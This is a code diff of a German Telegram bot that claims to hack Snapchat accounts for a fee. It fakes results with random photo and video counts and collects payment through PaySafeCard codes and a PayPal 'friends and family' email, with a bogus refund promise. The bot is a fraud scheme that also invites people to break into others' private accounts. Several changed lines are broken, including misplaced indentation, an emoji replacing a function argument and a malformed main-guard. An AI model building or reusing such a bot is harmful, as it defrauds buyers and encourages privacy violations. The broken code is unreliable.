@@ -91,7 +91,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "👉 https://t.me/+wf3YFvO0uJM5MGJh\n\n"
         "📢 Nach dem Beitritt kannst du sofort starten:\n"
         "/hack Benutzername\n\n"
-        "Schicke Beweise für Zahlungen (Bank & Crypto als Foto, Paysafe als Code) direkt hier im Chat."
+        "Schicke Beweise für Zahlungen (Paypal Überweisung Beweis Foto, Paysafe als Code) direkt hier im Chat."
     )
     await update.message.reply_text(text)
 
@@ -127,8 +127,7 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print("Fehler bei get_chat_member:", e)
         await update.message.reply_text("Fehler bei der Kanal-Überprüfung. Bitte versuche es später erneut.")
         return
-
-    if not context.args:
+if not context.args:
         await update.message.reply_text("Bitte gib den Snapchat-Benutzernamen ein, z.B. /hack Lina.123")
         return
 
@@ -136,7 +135,7 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     exists, name = check_snapchat_username_exists_and_get_name(username)
     if not exists:
         await update.message.reply_text(
-            f"Der Snapchat-Benutzername *{username}* wurde nicht gefunden.",
+            f"Der Snapchat-Benutzername {username} wurde nicht gefunden.",
             parse_mode=ParseMode.MARKDOWN
         )
         return
@@ -151,7 +150,7 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await asyncio.sleep(2)
 
     bilder = random.randint(16, 20)
-    videos = random.randint(7, 8)
+    videos = random.randint(7, 😍
 
     msg_text = (
         f"👾 Wir haben den Benutzer ({username}) gefunden, und das Konto ist angreifbar! 👾\n\n"
@@ -167,9 +166,9 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ---- PAY ----
 async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
-        [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
+
         [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
-        [InlineKeyboardButton("🪙 Kryptowährungen", callback_data="pay_crypto")],
+        [InlineKeyboardButton("🪙 PayPal", callback_data="pay_Paypal")],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)
@@ -184,15 +183,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "\n\n⚠️ <b>Wichtig:</b> Bei deiner <u>ersten Zahlung</u> hast du eine "
         "<b>5 Minuten Testphase</b>. Wenn du in dieser Zeit stornierst, bekommst du <b>45 €</b> zurück.\n\n"
         "📌 <b>Verwendungszweck:</b> Gib <u>deinen Telegram-Namen</u> an!"
-    )
-
-    if cmd == "pay_bank":
-        text = (
-            "🏦 <b>Banküberweisung</b>\n\n"
-            "Empfänger: Hedwig Theres\n"
-            "IBAN: <code>IE21PPSE99038051722125</code>\n"
-            f"{info_refund}"
-            "\n\nBitte sende hier ein Foto deines Zahlungsbelegs."
         )
     elif cmd == "pay_paysafe":
         text = (
@@ -201,15 +191,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "<code>0000-0000-0000-0000</code>\n"
             f"{info_refund}"
             "\n\nDer Code wird überprüft und weitergeleitet."
-        )
-    elif cmd == "pay_crypto":
+  )
+    elif cmd == "pay_paypal":
         text = (
-            "🪙 <b>Kryptowährungen</b>\n\n"
-            "- BTC: <code>bc1q72jdez5v3m7dvtlpq8lyw6u8zpql6al6flwwyr</code>\n"
-            "- ETH: <code>0xb213CaF608B8760F0fF3ea45923271c35EeA68F5</code>\n"
-            "- LTC: <code>ltc1q8wxmmw7mclyk55fcyet98ul60f4e9n7d9mejp3</code>\n"
-            f"{info_refund}"
-            "\n\nBitte sende hier ein Foto deines Zahlungsbelegs."
+            "💳 <b>PaySafeCard</b>\n\n"
+            "\n\Email: jessy.kla99@gmail.com."
+            "\n\send Beweisfoto an den Bot."
+            "\n\Bitte über Familie, Freunde, sonst Ungültig."
+            "\n\Verwendungszweck: Dein Telegram Name."
+           f"{info_refund}"
         )
     elif cmd == "pay":
         await pay(update, context)
@@ -225,8 +215,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ---- PHOTO (Beweis) ----
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     from_user = update.message.from_user
-
-    if from_user.id in user_proof_sent:
+if from_user.id in user_proof_sent:
         await update.message.reply_text("❌ Du kannst nur einmal einen Zahlungsbeweis senden.")
         return
 
@@ -277,7 +266,7 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
     faq_text = (
-        "📖 *Häufig gestellte Fragen (FAQ)*\n\n"
+        "📖 Häufig gestellte Fragen (FAQ)\n\n"
         "❓ Wie funktioniert das Ganze?\n"
         "💬 Gib den Befehl /hack Benutzername ein.\n\n"
         "❓ Wie lange dauert ein Hack?\n"
@@ -306,6 +295,6 @@ def main():
     print("✅ Bot läuft...")
     application.run_polling()
 
-if __name__ == "__main__":
+if name == "_main_":
     keep_alive()
     main()
